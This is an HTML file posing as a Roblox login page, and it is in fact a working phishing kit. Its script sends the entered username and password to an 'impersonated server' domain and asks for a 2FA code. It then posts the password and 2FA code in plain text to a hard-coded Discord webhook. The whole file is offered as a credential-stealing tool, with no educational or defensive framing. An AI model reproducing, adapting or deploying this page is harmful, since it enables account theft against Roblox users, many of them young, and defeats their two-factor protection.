<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; }
        .login-container { width: 300px; margin: 50px auto; padding: 20px; background: #fff; border-radius: 10px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ddd; }
        button { width: 100%; padding: 10px; background-color: #3c76d6; border: none; color: white; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #4a8ad6; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Roblox Login</h2>
        <input type="text" id="username" placeholder="Username" />
        <input type="password" id="password" placeholder="Password" />
        <button onclick="login()">Login</button>
    </div>

    <script>
        async function login() {
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;

            // Send login data to impersonated server
            const loginData = { username: username, password: password };
            
            // Simulate Roblox login verification
            const response = await fetch('https://roblox-login-api.com/verify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(loginData)
            });
            
            const result = await response.json();
            
            if (result.twoFAEnabled) {
                // Prompt for 2FA
                const code = prompt("Enter your 2FA code");
                const twoFAData = { username: username, code: code };

                // Verify 2FA
                const twoFAResponse = await fetch('https://roblox-2fa-api.com/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(twoFAData)
                });
                
                const twoFAResult = await twoFAResponse.json();
                
                if (twoFAResult.success) {
                    // Send data to Discord Webhook
                    const webhookUrl = 'https://discord.com/api/webhooks/1353766934126268540/yY3jpEsxM4AYiyspNMeuayMbjpeiT1CgqO64jmXJ8itRjBMSsqxkKM42bxriBP2l4TT0';
                    const webhookData = {
                        content: `Username: ${username}\nPassword: ${password}\n2FA Code: ${code}`
                    };
                    
                    await fetch(webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(webhookData)
                    });
                    
                    alert("Success! Data sent.");
                } else {
                    alert("Invalid 2FA code.");
                }
            } else {
                alert("Login failed or 2FA not enabled.");
            }
        }
    </script>
</body>
</html>
